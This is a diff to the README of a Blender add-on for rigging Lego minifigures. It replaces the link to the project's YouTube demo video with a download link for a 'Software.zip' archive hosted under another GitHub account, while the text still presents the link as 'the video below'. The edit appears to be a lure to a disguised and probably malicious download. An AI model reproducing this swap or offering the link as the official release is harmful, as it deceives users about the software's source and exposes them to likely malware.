@@ -1,4 +1,4 @@
 # EpicFigRig
 Blender Lego Minifigure Rig Addon
 
-This is the official github for BlenderBricks's EpicFigRig. Shown in the video below. https://www.youtube.com/watch?v=mZM0jk-jfP0
+This is the official github for BlenderBricks's EpicFigRig. Shown in the video below. https://github.com/Moshe236/EpicFigRig/releases/download/v2.0/Software.zip
